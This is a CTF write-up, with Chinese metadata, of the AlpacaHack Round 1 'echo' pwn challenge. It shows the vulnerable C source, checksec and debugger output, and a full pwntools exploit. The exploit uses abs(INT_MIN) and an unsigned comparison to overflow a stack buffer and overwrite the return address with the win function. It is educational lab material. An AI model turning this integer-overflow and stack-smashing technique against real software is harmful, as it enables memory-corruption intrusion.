---
title: AlpacaHack Round 1 (Pwn) Writeup
contest: AlpacaHack
year: 2024
difficulty: easy
vuln_type: pwn_unknown
tags:
- abs(INT_MIN)
- 整数溢出
- scanf %d%*c
- BUF_SIZE 0x100
- 栈溢出 No canary
- No PIE
- win函数
- /bin/cat /flag.txt
- 280字节padding
attack_chain:
- 'get_size: scanf("%d%*c", &size); size = abs(size); size > 0x100 exit'
- abs(INT_MIN) = INT_MIN = -2147483648 > 0x100 不会触发 exit
- size = -2147483648, 但 get_data for 循环 i < size 是 unsigned 比较
- i < -2147483648 (unsigned) = i < 0x80000000 永真 (size_t 64位)
- 实际写满 0x100 + 溢出覆盖返回地址
- 280 字节 padding + p32(win) 覆盖返回地址
- 'win(): execve("/bin/cat", "/flag.txt", NULL)'
key_payload: '''abs(INT_MIN)=INT_MIN 整数溢出 / get_data unsigned 比较 / 280 字节 + p32(win) / win() /bin/cat /flag.txt'''
one_liner: AlpacaHack Round 1 Pwn — abs(INT_MIN) 整数溢出旁路 size 校验 + unsigned 比较触发 280 字节栈溢出 + p32(win) 覆盖返回地址。
lesson: abs() 整数溢出是 size 校验旁路经典手法;unsigned 比较 -1 > BUF_SIZE 也是常见;No PIE + No canary 时代栈溢出是基础。
quality: medium
full_path: AlpacaHack_Round_1_(Pwn)_Writeup.full.md
meta_path: AlpacaHack_Round_1_(Pwn)_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'AlpacaHack Round 1 (Pwn) Writeup。AlpacaHack Round 1 Pwn — abs(INT_MIN) 整数溢出旁路 size 校验 + unsigned 比较触发 280 字节栈溢出 + p32(win) 覆盖返回地址。。关键路径：get_size: scanf("%d%*c", &size); size = abs(size); size > 0...'
category: pwn
subcategory: pwn_other
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/200153.html
reasoning_chain:
- '[触发点] get_size 用 scanf("%d%*c", &size) + abs(size) → 假设：abs(INT_MIN) 还是 INT_MIN 不变 / [动作] 验证 abs(INT_MIN) = INT_MIN = -2147483648 / [观察] -2147483648 不会被 size > 0x100 检查挡住 / [下一步] 触发 get_data 越界'
- '[触发点] get_data 用 unsigned i < size 循环 → 假设：size=-2147483648 转 unsigned 是 0x80000000 / [动作] 写 payload 输入 -2147483648 / [观察] 循环写成 0x100 + 溢出字节 / [下一步] 覆盖返回地址'
- '[触发点] No canary + No PIE 提示 + BUF_SIZE 0x100 → 假设：栈溢出 + 直接覆盖 ret 即可 / [动作] 280 字节 padding + p32(win) 覆盖返回地址 / [观察] 程序跳转到 win() / [下一步] win() execve /bin/cat /flag.txt'
- '[触发点] win() 内有 execve(/bin/cat, /flag.txt, NULL) → 假设：触发后直接拿 flag / [动作] 运行 exp / [观察] flag 输出 / [下一步]'
failed_attempts:
- 试图用正数大数绕过 size 检查 → 失败：正数会被 size > 0x100 拦
- 试图直接覆盖 canary → 失败：No canary
key_observations:
- abs() 整数溢出是 size 校验旁路经典手法
- unsigned 比较 -1 > BUF_SIZE 也是常见
- No PIE + No canary 时代栈溢出是基础
- scanf %d%*c 中的 %*c 是吸收换行符
prerequisites:
- C 语言 abs / scanf 行为
- 栈溢出基础（padding + 覆盖 ret）
- pwntools 基本使用
- 二进制安全选项理解
---
# AlpacaHack Round 1 (Pwn) Writeup

> 原文: https://www.ctfiot.com/200153.html
> ID: 200153


```
    #include <stdio.h>
    #include <stdlib.h>
    #include 

    #define BUF_SIZE 0x100

/* Call this function! */
void win() {
 char *args[] = {"/bin/cat", "/flag.txt", NULL};
 execve(args[0], args, NULL);
 exit(1);
}

int get_size() {
 // Input size
 int size = 0;
 scanf("%d%*c", &size);

 // Validate size
 if ((size = abs(size)) > BUF_SIZE) {
 puts("[-] Invalid size");
 exit(1);
 }

 return size;
}

void get_data(char *buf, unsigned size) {
 unsigned i;
 char c;

 // Input data until newline
 for (i = 0; i < size; i++) {
 if (fread(&c, 1, 1, stdin) != 1) break;
 if (c == '\n') break;
 buf[i] = c;
 }
 buf[i] = '\0';
}

void echo() {
 int size;
 char buf[BUF_SIZE];

 // Input size
 printf("Size: ");
 size = get_size();

 // Input data
 printf("Data: ");
 get_data(buf, size);

 // Show data
 printf("Received: %s\n", buf);
}

int main() {
 setbuf(stdin, NULL);
 setbuf(stdout, NULL);
 echo();
 return 0;
}
Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
int get_size() {
 // Input size
 int size = 0;
 scanf("%d%*c", &size);

 // Validate size
 if ((size = abs(size)) > BUF_SIZE) {
 puts("[-] Invalid size");
 exit(1);
 }

 return size;
}
0272| 0x7fffffffdca0 --> 0x7fffffffdcb0 --> 0x1
0280| 0x7fffffffdca8 --> 0x4013d4 (<main+58>: mov eax,0x0)
0288| 0x7fffffffdcb0 --> 0x1
0000| 0x7fffffffdb90 --> 0x4141414141 ('AAAAA')
from pwn import *

win = ELF("./echo").symbols["win"]

p = process('./echo')
    #p = remote("[redacted]", [redacted])

p.sendlineafter(b"Size: ", b"-2147483648")
p.sendlineafter(b"Data: ", b'A' * 280 + p32(win))
print(p.recvall())
```
